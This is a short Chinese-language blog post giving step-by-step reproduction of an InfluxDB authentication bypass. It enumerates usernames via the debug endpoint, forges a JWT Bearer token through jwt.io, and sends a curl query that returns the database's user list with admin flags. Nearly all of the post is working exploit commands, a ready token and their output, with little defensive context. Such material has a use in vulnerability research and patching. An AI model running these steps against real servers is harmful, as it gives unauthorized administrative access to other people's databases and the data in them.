---
layout:     post
title:      "influxdb认证绕过0day"
subtitle:   " 通过jwt token绕过认证"
date:       2019-05-31 15:00:00
author:     "tanjiti"
header-img: "img/post-bg-2015.jpg"
catalog: true
tags:
    - influxdb
    - 0 day
    - 认证绕过
---

# 0day复现步骤:

## 1. 查找user name
`curl -G "http://xxx:8086/debug/requests"`

## 2. 构造jwt token

[在线构造地址](https://jwt.io/)

![jwt_token](/img/influxdb0day.png)


## 3. 构造认证头

`curl -G 'http://xxx:8086/query' --data-urlencode 'q=show users' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNTU5Mjg0OTM1fQ.tUClNot9LgStSw57n26DSn-3NPkBiHizk-XOHMfJJJw'`

返回

`{"results":[{"statement_id":0,"series":[{"columns":["user","admin"],"values":[["admin",true],["read",false],["write",false],["telegraf",true]]}]}]}`

成功

>[JWT说明](http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html)

>[0day原文](https://www.komodosec.com/post/when-all-else-fails-find-a-0-day)
